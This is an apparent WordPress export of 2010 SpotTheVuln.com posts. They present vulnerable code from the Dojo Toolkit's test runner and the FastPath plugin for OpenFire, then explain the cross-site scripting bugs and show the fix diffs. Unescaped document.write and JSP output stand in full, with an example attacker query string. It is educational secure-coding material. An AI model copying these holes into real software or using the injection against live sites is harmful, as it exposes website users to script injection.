			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Learning - Insecure Logging (Defense in Depth)]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Learning - Insecure Logging (Defense in Depth)]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>enclosure</wp:meta_key>
			<wp:meta_value><![CDATA[http://spotthevuln.com/wordpress/wp-content/uploads/2010/05/mundanedetail.wav
247042
audio/x-wav
]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[9bd69d5a66d280d37eb04982f10ca82b]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cd3rN4]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Everything</title>
		<link>http://spotthevuln.com/2010/06/everything/</link>
		<pubDate>Mon, 07 Jun 2010 15:00:29 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=886</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Anybody who knows everything should be told a thing or two.
- Franklin P. Jones</strong></blockquote>
[ccnLe_php]

                &lt;script type="text/javascript"&gt;
                        // workaround for bug in Safari 3.  See #7189
                        if (/3[\.0-9]+ Safari/.test(navigator.appVersion))
                        {
                                window.console = {
                                    origConsole: window.console,
                                    log: function(s){
                                                this.origConsole.log(s);
                                        },
                                        info: function(s){
                                                this.origConsole.info(s);
                                        },
                                        error: function(s){
                                                this.origConsole.error(s);
                                        },
                                        warn: function(s){
                                                this.origConsole.warn(s);
                                        }
                               };
                        }
                &lt;/script&gt;
 
                &lt;script type="text/javascript"&gt;
                        window.dojoUrl = "../../dojo/dojo.js";
                        window.testUrl = "";
                        window.testModule = "";
 
                        // parse out our test URL and our Dojo URL from the query string
                        var qstr = window.location.search.substr(1);
                        if(qstr.length){
                                var qparts = qstr.split("&amp;");
                                for(var x=0; x&lt;qparts.length; x++){
                                        var tp = qparts[x].split("=");
                                        if(tp[0] == "dojoUrl"){
                                                window.dojoUrl = tp[1];
                                        }
                                        if(tp[0] == "testUrl"){
                                                window.testUrl = tp[1];
                                        }
                                        if(tp[0] == "testModule"){
                                                window.testModule = tp[1];
                                        }
                                        if(tp[0] == "registerModulePath"){
                                                var modules = tp[1].split(";");
                                                window.registerModulePath=[];
                                                for (var i=0; i&lt;modules.length;i++){
                                                         window.registerModulePath.push(modules[i].split(","));
                                                }
                                        }
                                }
                        }
 
                        document.write("&lt;scr"+"ipt type='text/javascript' djConfig='isDebug: true' src='"+dojoUrl+"'&gt;&lt;/scr"+"ipt&gt;");
                &lt;/script&gt;
                &lt;script type="text/javascript"&gt;
                        try{
                                dojo.require("doh.runner");
                        }catch(e){
                                document.write("&lt;scr"+"ipt type='text/javascript' src='runner.js'&gt;&lt;/scr"+"ipt&gt;");
                        }
                        if(testUrl.length){
                                document.write("&lt;scr"+"ipt type='text/javascript' src='"+testUrl+".js'&gt;&lt;/scr"+"ipt&gt;");
                        }
                &lt;/script&gt;
                &lt;style type="text/css"&gt;
                        @import "../../dojo/resources/dojo.css";
                        /*
                        body {
                                margin: 0px;
                                padding: 0px;
                                font-size: 13px;
                                color: #292929;
                                font-family: Myriad, Lucida Grande, Bitstream Vera Sans, Arial, Helvetica, sans-serif;
                                *font-size: small;
                                *font: x-small;
                        }
 
                        th, td {
                                font-size: 13px;
                                color: #292929;
                                font-family: Myriad, Lucida Grande, Bitstream Vera Sans, Arial, Helvetica, sans-serif;
                                font-weight: normal;
                        }
 
                        * body {
                                line-height: 1.25em;
                        }

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>886</wp:post_id>
		<wp:post_date>2010-06-07 08:00:29</wp:post_date>
		<wp:post_date_gmt>2010-06-07 15:00:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>everything</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[ccb753a36c97b8a039149c7e995dd662]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aD3PiL]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>504</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Everything &#8211; Cross Site Scripting ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/06/every-crosssitescripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-06-11 08:03:28</wp:comment_date>
			<wp:comment_date_gmt>2010-06-11 15:03:28</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Everything [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Everything – Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/06/every-crosssitescripting/</link>
		<pubDate>Fri, 11 Jun 2010 15:00:50 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=890</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Dojo Toolkit SDK

Fixed in Version: 1.4.2

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Everything" href="http://spotthevuln.com/2010/06/everything/" target="_blank">Found Here</a>
<h2>Description</h2>
This was a bug reported by the <a title="Gotham" href="http://www.gdssecurity.com/" target="_blank">Gotham Digital Science </a>against the Dojo toolkit SDK.  The Dojo toolkit is a popular toolkit used by numerous websites… so in essence this bug provided attackers an opportunity to XSS a large number of websites across the Internet.

The bug begins by the capturing of untrusted parameter values from the querystring.  This is done by the following JavaScript:
<blockquote><code>var qstr = window.location.search.substr(1);</code></blockquote>
qstr is then split based on the “&amp;” character, proving values for various JavaScript variables including DoJoURL and TestURL.   The attacker is free to provide arbitrary values for DoJoURL and TestURL by simply providing the proper querystring values.  For example:
<blockquote>runner.html?dojoUrl=attacker-controlled&amp;testUrl=attackercontrolled</blockquote>
the attacker supplied values are then used in a document.write() statement, giving the attacker the opprotuntiy to inject arbitrary client side script into any website that happens to include the Dojo library.  The vulnerable document.write() statements are provided below:
<blockquote>document.write("&lt;scr"+"ipt type='text/javascript' djConfig='isDebug: true' src='"+<span style="color: #ff0000;">dojoUrl</span>+"'&gt;&lt;/scr"+"ipt&gt;");

document.write("&lt;scr"+"ipt type='text/javascript' src='"+<span style="color: #ff0000;">testUrl</span>+".js'&gt;&lt;/scr"+"ipt&gt;");</blockquote>
The Dojo developers addressed this vulnerability by replacing characters from the attacker controlled input.  The specific regular expression used is provided below:
<blockquote>value=tp[1].replace(/[&lt;&gt;"']/g, "");</blockquote>
I see a major issue with this code fix… can you spot it as well?
<h2>Developers Solution</h2>
[cce lang="diff"]

                &lt;script type="text/javascript"&gt;
                        // workaround for bug in Safari 3.  See #7189
                        if (/3[\.0-9]+ Safari/.test(navigator.appVersion))
                        {
                                window.console = {
                                    origConsole: window.console,
                                    log: function(s){
                                                this.origConsole.log(s);
                                        },
                                        info: function(s){
                                                this.origConsole.info(s);
                                        },
                                        error: function(s){
                                                this.origConsole.error(s);
                                        },
                                        warn: function(s){
                                                this.origConsole.warn(s);
                                        }
                               };
                        }
                &lt;/script&gt;
 
                &lt;script type="text/javascript"&gt;
                        window.dojoUrl = "../../dojo/dojo.js";
                        window.testUrl = "";
                        window.testModule = "";
 
                        // parse out our test URL and our Dojo URL from the query string
                        var qstr = window.location.search.substr(1);
                        if(qstr.length){
                                var qparts = qstr.split("&amp;");
                                for(var x=0; x&lt;qparts.length; x++){
-                                       var tp = qparts[x].split("=");
-                                       if(tp[0] == "dojoUrl"){
-                                               window.dojoUrl = tp[1];
-                                       }
-                                       if(tp[0] == "testUrl"){
-                                               window.testUrl = tp[1];
-                                       }
-                                       if(tp[0] == "testModule"){
-                                               window.testModule = tp[1];
-                                       }
-                                       if(tp[0] == "registerModulePath"){
-                                               var modules = tp[1].split(";");
-                                               window.registerModulePath=[];
-                                               for (var i=0; i&lt;modules.length;i++){
-                                                        window.registerModulePath.push(modules[i].split(","));
-                                               }
-                                       }
+                                       var tp = qparts[x].split("="), name=tp[0], value=tp[1].replace(/[&lt;&gt;"']/g, "");  // replace() to avoid XSS attack 
+                                       switch(name){ 
+                                               case "dojoUrl": 
+                                               case "testUrl": 
+                                               case "testModule": 
+                                                       window[name] = value; 
+                                                       break; 
+                                               case "registerModulePath": 
+                                                       var modules = value.split(";"); 
+                                                       window.registerModulePath=[]; 
+                                                       for (var i=0; i&lt;modules.length;i++){ 
+                                                               window.registerModulePath.push(modules[i].split(",")); 
+                                                       } 
+                                               break; 
                                }
                        }
 
                        document.write("&lt;scr"+"ipt type='text/javascript' djConfig='isDebug: true' src='"+dojoUrl+"'&gt;&lt;/scr"+"ipt&gt;");
                &lt;/script&gt;
                &lt;script type="text/javascript"&gt;
                        try{
                                dojo.require("doh.runner");
                        }catch(e){
                                document.write("&lt;scr"+"ipt type='text/javascript' src='runner.js'&gt;&lt;/scr"+"ipt&gt;");
                        }
                        if(testUrl.length){
                                document.write("&lt;scr"+"ipt type='text/javascript' src='"+testUrl+".js'&gt;&lt;/scr"+"ipt&gt;");
                        }
                &lt;/script&gt;
                &lt;style type="text/css"&gt;
                        @import "../../dojo/resources/dojo.css";
                        /*
                        body {
                                margin: 0px;
                                padding: 0px;
                                font-size: 13px;
                                color: #292929;
                                font-family: Myriad, Lucida Grande, Bitstream Vera Sans, Arial, Helvetica, sans-serif;
                                *font-size: small;
                                *font: x-small;
                        }
 
                        th, td {
                                font-size: 13px;
                                color: #292929;
                                font-family: Myriad, Lucida Grande, Bitstream Vera Sans, Arial, Helvetica, sans-serif;
                                font-weight: normal;
                        }
 
                        * body {
                                line-height: 1.25em;
                        }

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>890</wp:post_id>
		<wp:post_date>2010-06-11 08:00:50</wp:post_date>
		<wp:post_date_gmt>2010-06-11 15:00:50</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>every-crosssitescripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="all-vulnerabilities"><![CDATA[All Vulnerabilities]]></category>
		<category domain="post_tag" nicename="arbitrary-values"><![CDATA[arbitrary values]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="client-side-script"><![CDATA[client side script]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="document-write"><![CDATA[document write]]></category>
		<category domain="category" nicename="dojo"><![CDATA[DoJo]]></category>
		<category domain="category" nicename="javascript"><![CDATA[JavaScript]]></category>
		<category domain="post_tag" nicename="javascript-variables"><![CDATA[javascript variables]]></category>
		<category domain="post_tag" nicename="parameter-values"><![CDATA[parameter values]]></category>
		<category domain="post_tag" nicename="querystring"><![CDATA[querystring]]></category>
		<category domain="post_tag" nicename="regular-expression"><![CDATA[regular expression]]></category>
		<category domain="post_tag" nicename="sdk"><![CDATA[sdk]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="text-javascript"><![CDATA[text javascript]]></category>
		<category domain="post_tag" nicename="validation-code"><![CDATA[validation code]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[48f627a4b8ec185db9ee7e9b068fb65a]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bEY87W]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Renting</title>
		<link>http://spotthevuln.com/2010/06/renting/</link>
		<pubDate>Mon, 14 Jun 2010 15:00:51 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=895</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Though beauty gives you a weird sense of entitlement, it's rather frightening and threatening to have others ascribe such importance to something you know you're just renting for a while.
- Candice Bergen</strong></blockquote>
*** Hint:  All chatUser properties are controlled by the user ***[ccnLe_php]

&lt;%@ page import="org.jivesoftware.smack.util.StringUtils"%&gt; 
&lt;%@ page import="org.jivesoftware.webchat.util.ParamUtils, java.util.*"%&gt; 
&lt;%@ page import="org.jivesoftware.webchat.actions.WorkgroupStatus" %&gt; 
&lt;!-- Get and Set Workgroup --&gt; 
&lt;jsp:useBean /&gt; 
&lt;jsp:setProperty property="*" /&gt; 
&lt;% 
    boolean authFailed = ParamUtils.getParameter(request, "authFailed") != null; 
 
    String location = (String)session.getAttribute("pageLocation"); 
    if (chatUser.hasSession()) { 
        chatUser.removeSession(); 
    } 
 
    String workgroup = chatUser.getWorkgroup(); 
    String chatID = chatUser.getChatID(); 
    if (chatID == null) { 
        chatID = StringUtils.randomString(10); 
    } 
 
    Workgroup chatWorkgroup = WorkgroupStatus.getWorkgroup(workgroup); 
    if (!chatWorkgroup.isAvailable()) { 
        response.sendRedirect("email/leave-a-message.jsp?workgroup=" + workgroup); 
        return; 
    } 
 
...&lt;SNIP&gt;...

&lt;html&gt; 
   &lt;head&gt; 
        &lt;title&gt;Information &lt;/title&gt; 
 
        &lt;link rel="stylesheet" 
              
               href="style.jsp?workgroup=&lt;%= workgroup %&gt;"/&gt;&lt;script src="common.js"&gt;//Ignore&lt;/script&gt; 
  &lt;/head&gt; 
  &lt;body style="margin-top:0px; margin-bottom:20px; margin-right:20px;margin-left:20px"&gt; 
    &lt;table width="100%" cellpadding="3" cellspacing="2"&gt; 
    &lt;tr&gt;&lt;td colspan="2" height="1%"&gt; 
    &lt;img src="getimage?image=logo&amp;workgroup=&lt;%= workgroup %&gt;"/&gt; 
        &lt;/td&gt; 
    &lt;/tr&gt; 
      &lt;form action="queue.jsp" method="post"&gt; 
       &lt;!-- Identify all hidden variables. All variables will be passed to the metadata router. 
            You can do any name-value pairing you like. Such as product=Jive Live Assistant. Such 
            data can be used to effectivly route to a particular queue within a workgroup. 
       --&gt; 
        &lt;input value="&lt;%= workgroup %&gt;"/&gt; 
        &lt;input value="&lt;%= chatID %&gt;" /&gt; 
        &lt;!-- End of Hidden Variable identifiers --&gt; 
            &lt;tr&gt; 
                &lt;td colspan="2" height="1%"&gt; 
                &lt;br/&gt;&lt;%=  welcomeText %&gt; 
               &lt;/td&gt; 
            &lt;/tr&gt; 
            &lt;tr&gt; 
              &lt;td height="1%"&gt; 
               &lt;br/&gt; 
              &lt;/td&gt; 
            &lt;/tr&gt; 
 
            &lt;% if (authFailed) { %&gt; 
           &lt;tr valign="top"&gt; 
               &lt;td colspan="2" height="1%" nowrap&gt;&lt;span&gt;Authentication Failed&lt;/span&gt;&lt;/td&gt; 
           &lt;/tr&gt; 
            &lt;% } %&gt; 
 
            &lt;% 
                       Iterator fields = workgroupForm.getFields(); 
                       while(fields.hasNext()){ 
                           hasElements = true; 
                           FormField field = (FormField)fields.next(); 
                           String label = field.getLabel(); 
                           boolean required = field.isRequired(); 
                           String requiredStr = required ? "&amp;nbsp;&lt;span class=\"error\"&gt;*&lt;/span&gt;" : ""; 
                           if(!field.getType().equals(FormField.TYPE_HIDDEN)){ 
                   %&gt; 
                   &lt;tr valign="top"&gt; 
                     &lt;td height="1%" width="1%" nowrap&gt;&lt;%= label%&gt;&lt;%= requiredStr%&gt;&lt;/td&gt;&lt;td&gt;&lt;%= FormUtils.createAnswers(field, request)%&gt;&lt;/td&gt; 
                   &lt;/tr&gt; 
                   &lt;% } } %&gt; 
 
            &lt;tr valign="top"&gt; 
              &lt;td height="1%"&gt; 
              &lt;!-- All workgroup defined variables --&gt; 
                &lt;% 
                       fields = workgroupForm.getFields(); 
                       while(fields.hasNext()){ 
                           FormField field = (FormField)fields.next(); 
                           if(field.getType().equals(FormField.TYPE_HIDDEN)){ 
                 %&gt; 
                 &lt;%= FormUtils.createDynamicField(field, request)%&gt; 
                &lt;% }} %&gt; 
              &lt;!-- End of Defined Variables --&gt; 
 
                 &lt;% // Handle page location 
                     if(location != null){ %&gt; 
                     &lt;input value="&lt;%= location%&gt;" /&gt; 
                 &lt;% } %&gt; 
              &lt;/td&gt; 
                &lt;td&gt; &lt;input value="&lt;%= startButton%&gt;"/&gt;&lt;/td&gt; 
            &lt;/tr&gt; 
            &lt;tr&gt; 
 
            &lt;/tr&gt; 
           &lt;/form&gt; 
          &lt;/table&gt; 
 &lt;div style="position:absolute;bottom:0px;right:5px"&gt;&lt;img src="getimage?image=poweredby&amp;workgroup=&lt;%= workgroup %&gt;"/&gt;&lt;/div&gt; 
  &lt;/body&gt; 
    &lt;%if(!hasElements){ %&gt; 
    &lt;script&gt; 
        document.f.submit(); 
    &lt;/script&gt; 
    &lt;%}%&gt; 
&lt;/html&gt; 

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>895</wp:post_id>
		<wp:post_date>2010-06-14 08:00:51</wp:post_date>
		<wp:post_date_gmt>2010-06-14 15:00:51</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>renting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bo0djY]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[7d39760d2ab46f3e3ee04f9b18746249]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>624</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Renting &#8211; Cross Site Scripting ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/06/renting-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-08-23 11:35:16</wp:comment_date>
			<wp:comment_date_gmt>2010-08-23 18:35:16</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Will &nbsp;&nbsp; Renting [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Renting – Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/06/renting-cross-site-scripting/</link>
		<pubDate>Fri, 18 Jun 2010 15:00:10 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=906</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: FastPath Plugin for OpenFire

Fixed in Version: 3.5.3

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Renting" href="http://spotthevuln.com/2010/06/renting/" target="_blank">Found Here</a>
<h2>Description</h2>
This weeks’ bug consisted of vulnerabilities in the FastPath plugin for OpenFire.  The FastPath plugin adds support for queued chat requests, much like those chat queues found on support websites across the internet.  Several code changes were made with this change list.  The first set of changes simply cleans up the imports used by the page and has no significant security impact.

The second set of changes we see URL encode user/attacker controlled items placed in a HTTP Redirect.  Although the security fix was labeled as “XSS fixes”, this particular change was likely to prevent CRLF injection into the location header for the JSP redirect (which could ultimately lead to XSS… ).

The remainder of the code fixes simply encodes HTML output before redisplaying it back to the user, defeating the classic XSS attack.
<h2>Developers Solution</h2>
[cce lang="diff"]

-&lt;%@ page import="org.jivesoftware.smack.util.StringUtils"%&gt;
-&lt;%@ page import="org.jivesoftware.webchat.util.ParamUtils, java.util.*"%&gt;
+&lt;%@ page import="java.util.*"%&gt;
&lt;%@ page import="org.jivesoftware.webchat.actions.WorkgroupStatus" %&gt;
+&lt;%@ page import="org.jivesoftware.webchat.util.*" %&gt;
&lt;!-- Get and Set Workgroup --&gt;
&lt;jsp:useBean /&gt;
&lt;jsp:setProperty property="*" /&gt;
&lt;%
boolean authFailed = ParamUtils.getParameter(request, "authFailed") != null;

String location = (String)session.getAttribute("pageLocation");
if (chatUser.hasSession()) {
chatUser.removeSession();
}

String workgroup = chatUser.getWorkgroup();
String chatID = chatUser.getChatID();
if (chatID == null) {
chatID = StringUtils.randomString(10);
}

Workgroup chatWorkgroup = WorkgroupStatus.getWorkgroup(workgroup);
if (!chatWorkgroup.isAvailable()) {
-       response.sendRedirect("email/leave-a-message.jsp?workgroup=" + workgroup);
+ response.sendRedirect("email/leave-a-message.jsp?workgroup=" + StringUtils.URLEncode(workgroup, "utf-8"));
return;
}

...&lt;SNIP&gt;...

&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Information &lt;/title&gt;

&lt;link rel="stylesheet"

href="style.jsp?workgroup=&lt;%= workgroup %&gt;"/&gt;&lt;script src="common.js"&gt;//Ignore&lt;/script&gt;
&lt;/head&gt;
&lt;body style="margin-top:0px; margin-bottom:20px; margin-right:20px;margin-left:20px"&gt;
&lt;table width="100%" cellpadding="3" cellspacing="2"&gt;
&lt;tr&gt;&lt;td colspan="2" height="1%"&gt;
&lt;img src="getimage?image=logo&amp;workgroup=&lt;%= workgroup %&gt;"/&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;form action="queue.jsp" method="post"&gt;
&lt;!-- Identify all hidden variables. All variables will be passed to the metadata router.
You can do any name-value pairing you like. Such as product=Jive Live Assistant. Such
data can be used to effectivly route to a particular queue within a workgroup.
--&gt;
